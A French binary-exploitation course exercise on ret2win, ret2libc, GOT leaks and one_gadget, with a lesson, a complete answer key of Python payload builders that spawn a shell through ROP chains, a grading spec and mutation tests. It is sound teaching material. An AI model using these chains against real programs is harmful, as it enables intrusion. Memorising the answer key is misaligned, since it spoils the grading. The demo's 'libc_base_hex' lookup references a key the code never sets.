# Exercice 3.4.5-d : ret2win et ret2libc

## Metadata
- **Exercice ID**: 3.4.5-d
- **Titre**: ret2win et ret2libc
- **Module**: 3.4 - Exploitation Binaire
- **Niveau**: Exploitation Stack (Niveau 3)
- **Difficulté**: ⭐⭐⭐⭐⭐ (5/10 - Intermédiaire)
- **Tier**: 2
- **XP**: 450

## Concepts Couverts
| ID Concept | Description |
|------------|-------------|
| 3.4.5.m | ret2win |
| 3.4.5.n | ret2libc Basic |
| 3.4.5.o | ret2libc Chaining |
| 3.4.5.r | One Gadget |

## Prerequis
- Module 3.4.5-a/b : Buffer overflow et offsets
- Comprehension de la calling convention x86-64
- Notions de GOT/PLT et linking dynamique

---

## Section 1 : Prototype de Fonction

```python
"""
Module: ret2techniques - Techniques d'Exploitation sans Shellcode
Architecture: x86-64 Linux
Contraintes: NX activé (pas d'exécution sur la stack)
"""

from dataclasses import dataclass
from typing import Optional
import struct


@dataclass
class BinaryInfo:
    """Informations sur un binaire."""
    win_function: Optional[int] = None
    system_plt: Optional[int] = None
    binsh_addr: Optional[int] = None
    pop_rdi_ret: Optional[int] = None
    ret_gadget: Optional[int] = None
    libc_base: Optional[int] = None


@dataclass
class LibcInfo:
    """Informations sur la libc."""
    base: int
    system_offset: int
    binsh_offset: int
    one_gadgets: list[dict]


def generate_ret2win_payload(
    offset: int,
    win_address: int,
    alignment_needed: bool = False,
    ret_gadget: int = None
) -> bytes:
    """
    Génère un payload ret2win simple.

    Args:
        offset: Bytes de padding avant RIP
        win_address: Adresse de la fonction win()
        alignment_needed: Si alignement stack nécessaire
        ret_gadget: Adresse d'un gadget RET pour alignement

    Returns:
        Payload pour appeler win()

    Exemple:
        >>> payload = generate_ret2win_payload(72, 0x401196)
        >>> len(payload)
        80
    """
    pass


def generate_ret2libc_simple(
    offset: int,
    system_addr: int,
    binsh_addr: int,
    pop_rdi_ret: int,
    ret_gadget: int = None
) -> bytes:
    """
    Génère un payload ret2libc pour system("/bin/sh").

    Args:
        offset: Bytes de padding
        system_addr: Adresse de system()
        binsh_addr: Adresse de "/bin/sh"
        pop_rdi_ret: Adresse du gadget "pop rdi; ret"
        ret_gadget: Gadget RET pour alignement (optionnel)

    Returns:
        Payload ret2libc

    Structure:
    [padding][ret?][pop_rdi_ret][binsh_addr][system]

    Exemple:
        >>> payload = generate_ret2libc_simple(72, 0x7f..., 0x7f..., 0x401263)
        >>> len(payload) >= 96
        True
    """
    pass


def find_one_gadgets(libc_path: str) -> list[dict]:
    """
    Trouve les one_gadgets dans une libc (simulation).

    Args:
        libc_path: Chemin vers la libc

    Returns:
        Liste de gadgets avec leurs contraintes

    Exemple:
        >>> gadgets = find_one_gadgets("/lib/x86_64-linux-gnu/libc.so.6")
        >>> gadgets[0]["offset"]
        0x4f3d5
        >>> gadgets[0]["constraints"]
        ['rax == NULL', '[rsp+0x40] == NULL']
    """
    pass


def generate_one_gadget_payload(
    offset: int,
    libc_base: int,
    one_gadget_offset: int,
    ret_gadget: int = None
) -> bytes:
    """
    Génère un payload utilisant un one_gadget.

    Args:
        offset: Padding jusqu'à RIP
        libc_base: Base de la libc
        one_gadget_offset: Offset du gadget dans la libc
        ret_gadget: Pour alignement si nécessaire

    Returns:
        Payload minimal pour spawner un shell

    Exemple:
        >>> payload = generate_one_gadget_payload(72, 0x7ffff7dc0000, 0x4f3d5)
        >>> len(payload)
        80
    """
    pass


def calculate_libc_addresses(
    leaked_addr: int,
    leaked_symbol: str,
    libc_info: dict
) -> dict:
    """
    Calcule les adresses libc à partir d'un leak.

    Args:
        leaked_addr: Adresse leakée
        leaked_symbol: Nom du symbole leaké (ex: "puts")
        libc_info: Dict avec les offsets libc

    Returns:
        Dict avec libc_base et adresses utiles

    Exemple:
        >>> info = {"puts": 0x80aa0, "system": 0x4f440, "binsh": 0x1b3e1a}
        >>> result = calculate_libc_addresses(0x7ffff7e4aaa0, "puts", info)
        >>> result["system"]
        0x7ffff7e19440
    """
    pass


def generate_rop_leak_payload(
    offset: int,
    puts_plt: int,
    puts_got: int,
    pop_rdi_ret: int,
    main_addr: int
) -> bytes:
    """
    Génère un payload qui leak une adresse libc et retourne à main.

    Args:
        offset: Padding
        puts_plt: Adresse de puts@plt
        puts_got: Adresse de puts@got
        pop_rdi_ret: Gadget pop rdi; ret
        main_addr: Adresse de main() pour reboucler

    Returns:
        Payload de leak

    Structure:
    [padding][pop_rdi_ret][puts@got][puts@plt][main]

    Exemple:
        >>> payload = generate_rop_leak_payload(72, 0x401030, 0x404018, 0x401263, 0x401196)
    """
    pass


def chain_ret2libc_with_arguments(
    offset: int,
    function_addr: int,
    args: list[int],
    gadgets: dict
) -> bytes:
    """
    Génère une chaîne ret2libc avec plusieurs arguments.

    Args:
        offset: Padding
        function_addr: Fonction à appeler
        args: Liste d'arguments (max 6 pour x64)
        gadgets: Dict avec gadgets (pop_rdi, pop_rsi, pop_rdx, etc.)

    Returns:
        Payload pour appeler function(args...)

    Note: x64 calling convention:
    - rdi = arg1, rsi = arg2, rdx = arg3
    - rcx = arg4, r8 = arg5, r9 = arg6
    """
    pass


def detect_stack_alignment_needed(
    crash_rsp: int,
    target_uses_sse: bool = True
) -> dict:
    """
    Détermine si un gadget RET d'alignement est nécessaire.

    Args:
        crash_rsp: RSP au moment où on contrôle RIP
        target_uses_sse: Si la cible utilise des instructions SIMD

    Returns:
        Dict avec analyse et recommandation
    """
    pass
```

---

## Section 2 : Cours Intégré (Référentiel Complet)

### 2.1 ret2win (3.4.5.m)

**ret2win** est la technique la plus simple d'exploitation sans shellcode. Elle consiste à rediriger l'exécution vers une fonction déjà présente dans le binaire qui fait ce qu'on veut (souvent appelée "win").

#### Principe

```
Avant overflow:
[buffer][saved_rbp][saved_rip] -> return to caller

Après overflow:
[AAAA...][AAAAAAAA][win_addr] -> return to win()
```

#### Exemple de fonction win

```c
void win() {
    system("/bin/sh");  // ou cat flag.txt
}

void vulnerable() {
    char buf[64];
    gets(buf);  // Overflow ici
}
```

#### Payload ret2win

```python
def ret2win(offset_to_rip, win_address):
    payload = b'A' * offset_to_rip
    payload += struct.pack('<Q', win_address)
    return payload
```

### 2.2 ret2libc Basic (3.4.5.n)

Quand il n'y a pas de fonction "win", on peut appeler des fonctions de la libc comme `system()`.

#### Problème: Passing Arguments

En x86-64, les arguments sont passés dans les registres:
- RDI = 1er argument
- RSI = 2ème argument
- RDX = 3ème argument
- etc.

Pour appeler `system("/bin/sh")`:
1. Mettre l'adresse de "/bin/sh" dans RDI
2. Appeler system()

#### Gadgets ROP

On utilise des **gadgets** - petites séquences d'instructions se terminant par RET:

```asm
; Gadget "pop rdi; ret"
pop rdi         ; Charge la valeur sur la stack dans RDI
ret             ; Continue au prochain gadget/fonction
```

#### Structure du Payload

```
Stack layout après overflow:

RSP -> [pop_rdi_ret]    ; Gadget pop rdi; ret
       [/bin/sh addr]   ; Argument pour RDI
       [system addr]    ; Fonction à appeler
```

### 2.3 ret2libc Chaining (3.4.5.o)

Pour des appels plus complexes, on chaîne plusieurs gadgets:

#### Exemple: system() avec setup complexe

```python
def ret2libc_chain(offset, gadgets, system, binsh):
    payload = b'A' * offset

    # Aligner la stack si nécessaire
    if needs_alignment:
        payload += p64(gadgets['ret'])

    # Setup RDI = "/bin/sh"
    payload += p64(gadgets['pop_rdi_ret'])
    payload += p64(binsh)

    # Appeler system
    payload += p64(system)

    return payload
```

#### Appel avec plusieurs arguments

```python
def call_with_args(func, args, gadgets):
    """
    Appelle func(arg1, arg2, arg3) via ROP.
    """
    chain = b''

    # arg1 -> RDI
    if len(args) >= 1:
        chain += p64(gadgets['pop_rdi_ret'])
        chain += p64(args[0])

    # arg2 -> RSI
    if len(args) >= 2:
        chain += p64(gadgets['pop_rsi_ret'])
        chain += p64(args[1])

    # arg3 -> RDX
    if len(args) >= 3:
        chain += p64(gadgets['pop_rdx_ret'])
        chain += p64(args[2])

    # Call function
    chain += p64(func)

    return chain
```

### 2.4 One Gadget (3.4.5.r)

Un **one_gadget** (ou "magic gadget") est une adresse dans la libc qui, si on y saute, spawn directement un shell.

#### Comment ça marche

Ces gadgets existent car la libc contient du code comme:

```c
// Quelque part dans la libc
if (some_condition) {
    execve("/bin/sh", rsp+0x50, environ);
}
```

Si les conditions sont réunies (certains registres/mémoire à zéro), sauter à cette adresse donne un shell.

#### Trouver les one_gadgets

L'outil `one_gadget` analyse la libc:

```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rax == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

#### Utilisation

```python
def one_gadget_exploit(offset, libc_base, gadget_offset):
    one_gadget_addr = libc_base + gadget_offset
    payload = b'A' * offset
    payload += p64(one_gadget_addr)
    return payload
```

#### Vérifier les contraintes

```python
def check_one_gadget_constraints(crash_context, constraints):
    """
    Vérifie si les contraintes d'un one_gadget sont satisfaites.
    """
    for constraint in constraints:
        if "rax == NULL" in constraint:
            if crash_context['rax'] != 0:
                return False
        if "[rsp+0x40] == NULL" in constraint:
            if crash_context['rsp_plus_0x40'] != 0:
                return False
    return True
```

### 2.5 Leaking Libc Address

Pour ret2libc avec ASLR, il faut d'abord leak une adresse libc.

#### Technique GOT Leak

```python
def leak_libc_via_puts():
    """
    Payload qui:
    1. Appelle puts(puts@got) pour afficher l'adresse de puts
    2. Retourne à main() pour relancer l'exploit
    """
    payload = b'A' * offset

    # puts(puts@got)
    payload += p64(pop_rdi_ret)
    payload += p64(puts_got)      # Argument: adresse de puts@got
    payload += p64(puts_plt)      # Appel puts@plt

    # Retour à main
    payload += p64(main_addr)

    return payload
```

#### Calculer la base libc

```python
def calculate_libc_base(leaked_puts, libc_puts_offset):
    """
    Leaked puts = libc_base + puts_offset
    donc libc_base = leaked_puts - puts_offset
    """
    return leaked_puts - libc_puts_offset
```

### 2.6 Stack Alignment

L'ABI x86-64 requiert RSP aligné sur 16 bytes lors d'un CALL.

#### Le problème

```
Quand on saute à system():
- system() fait "push rbp" (RSP -= 8)
- Puis utilise movaps [rsp+X], xmm0
- movaps requiert alignement 16 bytes
- Si RSP était mal aligné: SIGSEGV!
```

#### La solution: RET gadget

```python
def add_alignment_if_needed(payload, offset, target, ret_gadget):
    # Ajouter un RET avant la cible
    # RET fait: POP RIP (RSP += 8)
    # Donc RSP change de parité d'alignement

    return payload[:offset] + p64(ret_gadget) + payload[offset:]
```

---

## Section 3 : Zone de Correction

```python
"""
CORRECTION COMPLETE - ret2win et ret2libc
"""

from dataclasses import dataclass
from typing import Optional
import struct


@dataclass
class BinaryInfo:
    win_function: Optional[int] = None
    system_plt: Optional[int] = None
    binsh_addr: Optional[int] = None
    pop_rdi_ret: Optional[int] = None
    ret_gadget: Optional[int] = None
    libc_base: Optional[int] = None


@dataclass
class LibcInfo:
    base: int
    system_offset: int
    binsh_offset: int
    one_gadgets: list


def p64(value: int) -> bytes:
    """Pack une valeur 64-bit en little-endian."""
    return struct.pack('<Q', value)


def u64(data: bytes) -> int:
    """Unpack 8 bytes little-endian."""
    return struct.unpack('<Q', data.ljust(8, b'\x00'))[0]


def generate_ret2win_payload(
    offset: int,
    win_address: int,
    alignment_needed: bool = False,
    ret_gadget: int = None
) -> bytes:
    """Génère un payload ret2win simple."""

    payload = b'A' * offset

    if alignment_needed and ret_gadget:
        # Ajouter RET gadget pour alignement
        payload += p64(ret_gadget)

    # Adresse de la fonction win
    payload += p64(win_address)

    return payload


def generate_ret2libc_simple(
    offset: int,
    system_addr: int,
    binsh_addr: int,
    pop_rdi_ret: int,
    ret_gadget: int = None
) -> bytes:
    """Génère un payload ret2libc pour system("/bin/sh")."""

    payload = b'A' * offset

    # Alignement si nécessaire
    if ret_gadget:
        payload += p64(ret_gadget)

    # Setup: pop rdi; ret
    payload += p64(pop_rdi_ret)

    # Argument: adresse de "/bin/sh"
    payload += p64(binsh_addr)

    # Appel: system()
    payload += p64(system_addr)

    return payload


def find_one_gadgets(libc_path: str) -> list:
    """
    Trouve les one_gadgets dans une libc.
    Note: En production, utiliser l'outil one_gadget.
    """

    # Simulated one_gadgets pour différentes versions de libc
    # Ces valeurs sont des exemples réels de libc 2.31

    simulated_gadgets = {
        "libc-2.31": [
            {
                "offset": 0xe6c7e,
                "constraints": ["rax == NULL"],
                "description": "execve('/bin/sh', rsp+0x50, environ)"
            },
            {
                "offset": 0xe6c81,
                "constraints": ["[rsp+0x50] == NULL"],
                "description": "execve('/bin/sh', rsp+0x50, environ)"
            },
            {
                "offset": 0xe6c84,
                "constraints": ["rsp & 0xf == 0", "rcx == NULL"],
                "description": "execve('/bin/sh', rsp+0x50, environ)"
            }
        ],
        "libc-2.27": [
            {
                "offset": 0x4f3d5,
                "constraints": ["rax == NULL"],
                "description": "execve('/bin/sh', rsp+0x40, environ)"
            },
            {
                "offset": 0x4f432,
                "constraints": ["[rsp+0x40] == NULL"],
                "description": "execve('/bin/sh', rsp+0x40, environ)"
            },
            {
                "offset": 0x10a41c,
                "constraints": ["[rsp+0x70] == NULL"],
                "description": "execve('/bin/sh', rsp+0x70, environ)"
            }
        ],
        "default": [
            {
                "offset": 0xe6c7e,
                "constraints": ["rax == NULL"],
                "description": "execve('/bin/sh', rsp+0x50, environ)"
            }
        ]
    }

    # Déterminer quelle version de libc
    for version in simulated_gadgets:
        if version in libc_path:
            return simulated_gadgets[version]

    return simulated_gadgets["default"]


def generate_one_gadget_payload(
    offset: int,
    libc_base: int,
    one_gadget_offset: int,
    ret_gadget: int = None
) -> bytes:
    """Génère un payload utilisant un one_gadget."""

    payload = b'A' * offset

    # Alignement si nécessaire
    if ret_gadget:
        payload += p64(ret_gadget)

    # Calculer l'adresse absolue du one_gadget
    one_gadget_addr = libc_base + one_gadget_offset

    # Sauter au one_gadget
    payload += p64(one_gadget_addr)

    return payload


def calculate_libc_addresses(
    leaked_addr: int,
    leaked_symbol: str,
    libc_info: dict
) -> dict:
    """Calcule les adresses libc à partir d'un leak."""

    # Récupérer l'offset du symbole leaké
    leaked_offset = libc_info.get(leaked_symbol)
    if leaked_offset is None:
        raise ValueError(f"Unknown symbol: {leaked_symbol}")

    # Calculer la base
    libc_base = leaked_addr - leaked_offset

    # Calculer toutes les adresses utiles
    result = {
        "libc_base": libc_base,
        "leaked_symbol": leaked_symbol,
        "leaked_addr": hex(leaked_addr),
        "leaked_offset": hex(leaked_offset)
    }

    # Ajouter les adresses pour chaque symbole connu
    for symbol, offset in libc_info.items():
        result[symbol] = libc_base + offset
        result[f"{symbol}_hex"] = hex(libc_base + offset)

    return result


def generate_rop_leak_payload(
    offset: int,
    puts_plt: int,
    puts_got: int,
    pop_rdi_ret: int,
    main_addr: int
) -> bytes:
    """Génère un payload qui leak une adresse libc et retourne à main."""

    payload = b'A' * offset

    # Étape 1: Appeler puts(puts@got)
    # Cela affiche l'adresse réelle de puts dans la libc

    # pop rdi; ret - met puts@got dans RDI
    payload += p64(pop_rdi_ret)
    payload += p64(puts_got)

    # Appel puts@plt
    payload += p64(puts_plt)

    # Étape 2: Retourner à main pour continuer l'exploit
    payload += p64(main_addr)

    return payload


def chain_ret2libc_with_arguments(
    offset: int,
    function_addr: int,
    args: list,
    gadgets: dict
) -> bytes:
    """Génère une chaîne ret2libc avec plusieurs arguments."""

    payload = b'A' * offset

    # Alignement si disponible
    if gadgets.get('ret'):
        payload += p64(gadgets['ret'])

    # x86-64 calling convention:
    # RDI, RSI, RDX, RCX, R8, R9

    arg_registers = ['pop_rdi_ret', 'pop_rsi_ret', 'pop_rdx_ret',
                     'pop_rcx_ret', 'pop_r8_ret', 'pop_r9_ret']

    for i, arg in enumerate(args):
        if i >= 6:
            # Plus de 6 arguments -> sur la stack (non géré ici)
            break

        gadget_name = arg_registers[i]
        gadget = gadgets.get(gadget_name)

        if gadget is None:
            # Pas de gadget pour ce registre
            # On pourrait utiliser des techniques alternatives
            continue

        payload += p64(gadget)
        payload += p64(arg)

    # Appel de la fonction
    payload += p64(function_addr)

    return payload


def detect_stack_alignment_needed(
    crash_rsp: int,
    target_uses_sse: bool = True
) -> dict:
    """Détermine si un gadget RET d'alignement est nécessaire."""

    # RSP doit être aligné sur 16 bytes pour les instructions SSE
    alignment = crash_rsp % 16

    is_aligned = (alignment == 0)

    result = {
        "rsp_value": hex(crash_rsp),
        "current_alignment": alignment,
        "is_aligned": is_aligned,
        "target_uses_sse": target_uses_sse,
        "needs_alignment_gadget": not is_aligned and target_uses_sse
    }

    if result["needs_alignment_gadget"]:
        result["recommendation"] = (
            "Add a 'ret' gadget before target to adjust RSP by 8 bytes"
        )
        result["explanation"] = (
            f"RSP (0x{crash_rsp:x}) is not 16-byte aligned. "
            "Functions using SSE/AVX instructions (like system()) will crash. "
            "Adding a RET gadget adjusts RSP by 8 bytes."
        )
    else:
        result["recommendation"] = "No alignment gadget needed"
        result["explanation"] = (
            "RSP is already aligned or target doesn't use SSE"
        )

    return result


def build_complete_exploit(
    offset: int,
    binary_info: BinaryInfo,
    libc_info: dict = None,
    technique: str = "ret2win"
) -> dict:
    """
    Construit un exploit complet basé sur la technique choisie.
    """

    result = {
        "technique": technique,
        "payload": b'',
        "explanation": []
    }

    if technique == "ret2win":
        if binary_info.win_function is None:
            return {"error": "No win function found"}

        # Vérifier alignement
        alignment_check = detect_stack_alignment_needed(0x7fff0008, True)

        payload = generate_ret2win_payload(
            offset,
            binary_info.win_function,
            alignment_check["needs_alignment_gadget"],
            binary_info.ret_gadget
        )

        result["payload"] = payload
        result["explanation"] = [
            f"Padding: {offset} bytes",
            f"Target: win() at 0x{binary_info.win_function:x}",
            f"Alignment needed: {alignment_check['needs_alignment_gadget']}"
        ]

    elif technique == "ret2libc":
        if None in [binary_info.system_plt, binary_info.binsh_addr,
                    binary_info.pop_rdi_ret]:
            return {"error": "Missing required addresses for ret2libc"}

        payload = generate_ret2libc_simple(
            offset,
            binary_info.system_plt,
            binary_info.binsh_addr,
            binary_info.pop_rdi_ret,
            binary_info.ret_gadget
        )

        result["payload"] = payload
        result["explanation"] = [
            f"Padding: {offset} bytes",
            f"Gadget: pop rdi; ret at 0x{binary_info.pop_rdi_ret:x}",
            f"Argument: '/bin/sh' at 0x{binary_info.binsh_addr:x}",
            f"Target: system() at 0x{binary_info.system_plt:x}"
        ]

    elif technique == "one_gadget":
        if binary_info.libc_base is None:
            return {"error": "Libc base not known"}

        gadgets = find_one_gadgets("/lib/libc.so.6")
        if not gadgets:
            return {"error": "No one_gadgets found"}

        payload = generate_one_gadget_payload(
            offset,
            binary_info.libc_base,
            gadgets[0]["offset"],
            binary_info.ret_gadget
        )

        result["payload"] = payload
        result["one_gadget"] = gadgets[0]
        result["explanation"] = [
            f"Padding: {offset} bytes",
            f"Libc base: 0x{binary_info.libc_base:x}",
            f"One gadget offset: 0x{gadgets[0]['offset']:x}",
            f"Constraints: {gadgets[0]['constraints']}"
        ]

    return result


def main():
    """Démonstration des techniques ret2."""

    print("ret2win et ret2libc Demo")
    print("=" * 60)

    # Exemple 1: ret2win
    print("\n[1] ret2win")
    payload = generate_ret2win_payload(72, 0x401196)
    print(f"Payload length: {len(payload)}")
    print(f"Target: 0x401196")

    # Exemple 2: ret2libc
    print("\n[2] ret2libc simple")
    payload = generate_ret2libc_simple(
        offset=72,
        system_addr=0x7ffff7e4f420,
        binsh_addr=0x7ffff7f7e1d8,
        pop_rdi_ret=0x401263,
        ret_gadget=0x40101a
    )
    print(f"Payload length: {len(payload)}")

    # Exemple 3: Leak libc
    print("\n[3] Libc address calculation")
    libc_offsets = {
        "puts": 0x80aa0,
        "system": 0x4f440,
        "binsh": 0x1b3e1a
    }
    leaked = 0x7ffff7e4aaa0  # Exemple d'adresse leakée pour puts
    addrs = calculate_libc_addresses(leaked, "puts", libc_offsets)
    print(f"Libc base: {addrs['libc_base_hex']}")
    print(f"system(): {addrs['system_hex']}")
    print(f"/bin/sh: {addrs['binsh_hex']}")

    # Exemple 4: One gadget
    print("\n[4] One gadget")
    gadgets = find_one_gadgets("/lib/x86_64-linux-gnu/libc.so.6")
    print(f"Found {len(gadgets)} gadgets:")
    for g in gadgets[:2]:
        print(f"  0x{g['offset']:x}: {g['constraints']}")

    # Exemple 5: Alignment check
    print("\n[5] Stack alignment check")
    check = detect_stack_alignment_needed(0x7fff0008)
    print(f"RSP: {check['rsp_value']}")
    print(f"Aligned: {check['is_aligned']}")
    print(f"Needs RET: {check['needs_alignment_gadget']}")


if __name__ == "__main__":
    main()
```

---

## Section 4 : Fichier spec.json (ENGINE v22.1)

```json
{
  "exercise_id": "3.4.5-d",
  "title": "ret2win et ret2libc",
  "module": "3.4",
  "tier": 2,
  "difficulty": 5,
  "xp_value": 450,
  "language": "python",
  "version": "3.12",
  "timeout_seconds": 30,
  "memory_limit_mb": 128,

  "test_cases": [
    {
      "id": "ret2win_basic",
      "description": "Generate basic ret2win payload",
      "input": {
        "function": "generate_ret2win_payload",
        "args": {"offset": 72, "win_address": 4198806, "alignment_needed": false}
      },
      "expected": {
        "length": 80
      },
      "points": 15
    },
    {
      "id": "ret2win_aligned",
      "description": "ret2win with alignment gadget",
      "input": {
        "function": "generate_ret2win_payload",
        "args": {"offset": 72, "win_address": 4198806, "alignment_needed": true, "ret_gadget": 4198426}
      },
      "expected": {
        "length": 88
      },
      "points": 10
    },
    {
      "id": "ret2libc_simple",
      "description": "Generate ret2libc payload",
      "input": {
        "function": "generate_ret2libc_simple",
        "args": {
          "offset": 72,
          "system_addr": 140737352209440,
          "binsh_addr": 140737353482712,
          "pop_rdi_ret": 4199011
        }
      },
      "expected": {
        "length": 96
      },
      "points": 20
    },
    {
      "id": "calculate_libc",
      "description": "Calculate libc addresses from leak",
      "input": {
        "function": "calculate_libc_addresses",
        "args": {
          "leaked_addr": 140737353427616,
          "leaked_symbol": "puts",
          "libc_info": {"puts": 526496, "system": 324672, "binsh": 1785370}
        }
      },
      "expected": {
        "libc_base": 140737352901120,
        "system": 140737353225792
      },
      "points": 15
    },
    {
      "id": "one_gadget_payload",
      "description": "Generate one_gadget payload",
      "input": {
        "function": "generate_one_gadget_payload",
        "args": {
          "offset": 72,
          "libc_base": 140737352901120,
          "one_gadget_offset": 945278
        }
      },
      "expected": {
        "length": 80
      },
      "points": 15
    },
    {
      "id": "leak_payload",
      "description": "Generate GOT leak payload",
      "input": {
        "function": "generate_rop_leak_payload",
        "args": {
          "offset": 72,
          "puts_plt": 4198448,
          "puts_got": 4210712,
          "pop_rdi_ret": 4199011,
          "main_addr": 4198806
        }
      },
      "expected": {
        "min_length": 104
      },
      "points": 15
    },
    {
      "id": "alignment_detection",
      "description": "Detect stack misalignment",
      "input": {
        "function": "detect_stack_alignment_needed",
        "args": {"crash_rsp": 140737488289800, "target_uses_sse": true}
      },
      "expected": {
        "is_aligned": false,
        "needs_alignment_gadget": true
      },
      "points": 10
    }
  ],

  "validation": {
    "required_functions": [
      "generate_ret2win_payload",
      "generate_ret2libc_simple",
      "find_one_gadgets",
      "generate_one_gadget_payload",
      "calculate_libc_addresses",
      "generate_rop_leak_payload",
      "chain_ret2libc_with_arguments",
      "detect_stack_alignment_needed"
    ],
    "forbidden_imports": ["pwntools", "pwnlib", "subprocess"],
    "min_test_coverage": 80
  }
}
```

---

## Section 5 : Tests de Mutation

```python
"""
Tests de mutation pour ret2techniques.py
"""

import unittest


class TestRet2WinMutations(unittest.TestCase):

    def setUp(self):
        from ret2techniques import generate_ret2win_payload, p64
        self.generate = generate_ret2win_payload
        self.p64 = p64

    # Mutant 1: Wrong payload length
    def test_mutant_payload_length(self):
        """MUTANT: Payload length incorrect."""
        payload = self.generate(72, 0x401196)
        self.assertEqual(len(payload), 80)  # 72 padding + 8 address

    # Mutant 2: Alignment gadget not added
    def test_mutant_alignment_added(self):
        """MUTANT: Not adding alignment gadget when needed."""
        payload_aligned = self.generate(72, 0x401196, True, 0x40101a)
        payload_normal = self.generate(72, 0x401196, False)

        self.assertEqual(len(payload_aligned), 88)  # +8 for ret gadget
        self.assertEqual(len(payload_normal), 80)


class TestRet2LibcMutations(unittest.TestCase):

    def setUp(self):
        from ret2techniques import generate_ret2libc_simple, p64
        self.generate = generate_ret2libc_simple
        self.p64 = p64

    # Mutant 3: Wrong gadget order
    def test_mutant_gadget_order(self):
        """MUTANT: Gadgets in wrong order."""
        payload = self.generate(
            72, 0x7f001000, 0x7f002000, 0x401263
        )

        # Structure should be: padding + pop_rdi + binsh + system
        # Check that addresses appear in correct order
        idx_pop = payload.find(self.p64(0x401263))
        idx_binsh = payload.find(self.p64(0x7f002000))
        idx_system = payload.find(self.p64(0x7f001000))

        self.assertLess(idx_pop, idx_binsh)
        self.assertLess(idx_binsh, idx_system)

    # Mutant 4: Missing binsh argument
    def test_mutant_includes_binsh(self):
        """MUTANT: Not including /bin/sh address."""
        payload = self.generate(
            72, 0x7f001000, 0x7f002000, 0x401263
        )
        self.assertIn(self.p64(0x7f002000), payload)


class TestLibcCalculationMutations(unittest.TestCase):

    def setUp(self):
        from ret2techniques import calculate_libc_addresses
        self.calculate = calculate_libc_addresses

    # Mutant 5: Wrong base calculation
    def test_mutant_base_calculation(self):
        """MUTANT: Calculating base incorrectly."""
        libc_info = {
            "puts": 0x80aa0,
            "system": 0x4f440
        }
        leaked = 0x7ffff7e4aaa0

        result = self.calculate(leaked, "puts", libc_info)

        # base = leaked - offset
        expected_base = leaked - 0x80aa0
        self.assertEqual(result["libc_base"], expected_base)

    # Mutant 6: Wrong symbol addresses
    def test_mutant_symbol_addresses(self):
        """MUTANT: Calculating symbol addresses incorrectly."""
        libc_info = {
            "puts": 0x1000,
            "system": 0x2000
        }
        leaked = 0x10001000

        result = self.calculate(leaked, "puts", libc_info)

        expected_system = result["libc_base"] + 0x2000
        self.assertEqual(result["system"], expected_system)


class TestOneGadgetMutations(unittest.TestCase):

    def setUp(self):
        from ret2techniques import (
            generate_one_gadget_payload,
            find_one_gadgets, p64
        )
        self.generate = generate_one_gadget_payload
        self.find = find_one_gadgets
        self.p64 = p64

    # Mutant 7: One gadget address wrong
    def test_mutant_address_calculation(self):
        """MUTANT: Wrong one_gadget address calculation."""
        libc_base = 0x7ffff7dc0000
        offset = 0x4f3d5

        payload = self.generate(72, libc_base, offset)

        expected_addr = libc_base + offset
        self.assertIn(self.p64(expected_addr), payload)


class TestAlignmentMutations(unittest.TestCase):

    def setUp(self):
        from ret2techniques import detect_stack_alignment_needed
        self.detect = detect_stack_alignment_needed

    # Mutant 8: Alignment check inverted
    def test_mutant_alignment_check(self):
        """MUTANT: Inverted alignment check."""
        # 0x...8 is NOT aligned (8 % 16 = 8)
        result_misaligned = self.detect(0x7fff0008)
        self.assertFalse(result_misaligned["is_aligned"])
        self.assertTrue(result_misaligned["needs_alignment_gadget"])

        # 0x...0 IS aligned (0 % 16 = 0)
        result_aligned = self.detect(0x7fff0010)
        self.assertTrue(result_aligned["is_aligned"])
        self.assertFalse(result_aligned["needs_alignment_gadget"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
```

---

## Section 6 : QCM d'Auto-Évaluation

### Question 1
**Qu'est-ce que ret2win ?**

- [x] A) Rediriger l'exécution vers une fonction "win" existante dans le binaire
- [ ] B) Une technique de ROP complexe
- [ ] C) Un type de shellcode
- [ ] D) Une méthode de bypass ASLR

**Explication**: ret2win est la technique la plus simple: on overwrite RIP pour pointer vers une fonction déjà présente qui fait ce qu'on veut (typiquement system() ou lecture de flag).

---

### Question 2
**Quel gadget est essentiel pour ret2libc sur x86-64 ?**

- [ ] A) pop rax; ret
- [x] B) pop rdi; ret
- [ ] C) leave; ret
- [ ] D) nop; ret

**Explication**: En x86-64, le premier argument est passé dans RDI. Pour appeler system("/bin/sh"), il faut d'abord mettre l'adresse de "/bin/sh" dans RDI via "pop rdi; ret".

---

### Question 3
**Qu'est-ce qu'un one_gadget ?**

- [ ] A) Un gadget ROP universel
- [x] B) Une adresse dans la libc qui spawn directement un shell
- [ ] C) Un gadget qui bypass ASLR
- [ ] D) Un shellcode encodé

**Explication**: Un one_gadget est une adresse dans la libc où du code existant appelle execve("/bin/sh", ...) si certaines conditions (contraintes) sont satisfaites.

---

### Question 4
**Pourquoi faut-il parfois ajouter un gadget RET avant d'appeler system() ?**

- [ ] A) Pour bypass le canary
- [ ] B) Pour bypass NX
- [x] C) Pour aligner RSP sur 16 bytes (requis par l'ABI x64)
- [ ] D) Pour nettoyer la stack

**Explication**: L'ABI x86-64 requiert RSP aligné sur 16 bytes lors d'un CALL. Les instructions SIMD (movaps) dans system() crashent si RSP n'est pas aligné. Un RET ajuste RSP de 8 bytes.

---

### Question 5
**Comment leak une adresse libc avec puts ?**

- [ ] A) Appeler puts(system)
- [x] B) Appeler puts(puts@got) pour afficher l'adresse réelle de puts
- [ ] C) Appeler puts(libc_base)
- [ ] D) Appeler puts("/bin/sh")

**Explication**: puts@got contient l'adresse réelle de puts dans la libc (après la résolution dynamique). En appelant puts(puts@got), on affiche cette adresse, qu'on peut ensuite utiliser pour calculer la base libc.

---

### Question 6
**Comment calculer l'adresse de system() après avoir leaké puts ?**

- [ ] A) system = leaked_puts + offset
- [x] B) libc_base = leaked_puts - puts_offset, puis system = libc_base + system_offset
- [ ] C) system = leaked_puts XOR key
- [ ] D) Impossible sans leak supplémentaire

**Explication**: La base de la libc = adresse leakée - offset du symbole leaké. Ensuite, toute adresse = base + offset du symbole voulu.

---

## Section 7 : Conseils et Pièges

### Pièges Courants

1. **Oublier l'alignement stack**: Crash mystérieux sur movaps.

2. **Mauvais ordre des gadgets**: pop_rdi doit venir AVANT l'argument.

